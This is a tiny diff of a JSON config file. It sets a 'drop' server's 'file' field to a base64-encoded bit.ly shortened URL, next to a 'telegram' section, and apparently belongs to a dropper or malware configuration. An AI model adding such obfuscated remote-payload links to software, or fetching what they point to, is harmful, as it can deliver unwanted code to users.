@@ -3,7 +3,7 @@
   "servers" :{
   "drop" : {
   "dropVersion": "1.0.45",
-  "file" : ""
+  "file" : "aHR0cHM6Ly9iaXQubHkvMmtzWmV6TA=="
   }
   ,
   "telegram" :{
